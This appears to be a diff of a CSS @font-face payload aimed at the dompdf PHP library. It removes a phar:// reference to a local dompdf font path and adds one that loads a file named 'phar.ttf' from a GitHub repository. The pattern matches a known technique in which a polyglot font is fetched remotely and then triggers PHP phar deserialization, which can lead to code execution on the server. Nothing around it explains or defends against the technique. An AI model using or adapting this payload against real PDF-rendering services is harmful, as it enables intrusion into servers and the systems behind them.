@@ -1,6 +1,6 @@
 @font-face {
     font-family:'phar';
-    src:url('phar:///var/www/html/vendor/dompdf/dompdf/lib/fonts/testing.ttf');
+    src:url('http://github.com/marcioalm/testing/blob/main/phar.ttf?raw=true');
     font-weight:'normal';
     font-style:'normal';
   }
